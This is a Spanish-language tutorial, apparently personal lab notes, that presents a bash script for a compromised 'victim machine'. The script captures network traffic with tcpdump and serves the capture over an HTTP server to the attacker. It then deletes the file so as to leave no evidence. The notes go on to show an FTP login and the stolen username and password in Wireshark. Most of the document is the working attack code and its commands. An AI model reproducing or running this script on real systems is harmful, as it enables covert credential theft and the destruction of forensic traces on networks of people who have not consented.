
Creamos un ``script`` para interceptar el ``tráfico de la red`` y que lo envíe por un ``servidor web`` a la máquina atacante

Código explicado:

```Bash
#/bin/bash

#Creamos las variables
interfaz="eth0"
paquete="captura.pcap"
puerto_http="80"

#Con tcpdump capturamos el tráfico de la red y lo dejamos en segundo plano
tcpdump -i $interfaz -w $paquete &

#Dejamos un descanso de 5 segundos para evitar errores
sleep 5

#Levantamos un servidor en el puerto 80 y lo dejamos en segundo plano
python3 -m http.server $puerto_http &

#Ponemos una duración de 60 segundos para que sigan interceptando durante ese tiempo
sleep 60

#Creamos una variable para obtener el PID de los procesos que se abren con tcpdump y python
proceso_tcpdump=$(pgrep tcpdump)
proceso_python=$(pgrep python3)

#Paramos los procesos
kill $proceso_tcpdump
kill $proceso_python

echo "La captura se realizó correctamente y se envió el archivo '.pcap' por el servidor web"

#Borramos el archivo para no dejar pruebas en la máquina víctima 
rm $paquete
```

![[Pasted image 20240701104700.png]]

Código limpio:

```Bash
#/bin/bash

interfaz="eth0"
paquete="captura.pcap"
puerto_http="80"

tcpdump -i $interfaz -w $paquete &

sleep 5

python3 -m http.server $puerto_http &

sleep 60

proceso_tcpdump=$(pgrep tcpdump)
proceso_python=$(pgrep python3)

kill $proceso_tcpdump
kill $proceso_python

echo "La captura se realizó correctamente y se envió el archivo '.pcap' por el servidor web"

rm $paquete
```

![[Pasted image 20240701104825.png]]

Le damos permisos:

Le damos permisos:

```Bash
chmod +x snifer.sh
```

![[Pasted image 20240701102654.png]]

Ejecutamos el ``script``:

```Bash
./snifer.sh
```

![[Pasted image 20240701103529.png]]

Iniciamos una sesión de ``FTP``:

```Bash
ftp 10.0.2.50
```

![[Pasted image 20240701103437.png]]

Nos vamos a máquina atacante y nos ``descargamos`` el paquete del ``servidor web``:

![[Pasted image 20240701103928.png]]

Ya terminó el ``script``:

![[Pasted image 20240701104430.png]]

Abrimos el paquete descargador con **wireshark**:

```Bash
wireshark captura.pcap
```

![[Pasted image 20240701103411.png]]

Vemos que ``capturó`` el ``usuario`` y la ``contraseña``:

![[Pasted image 20240701103325.png]]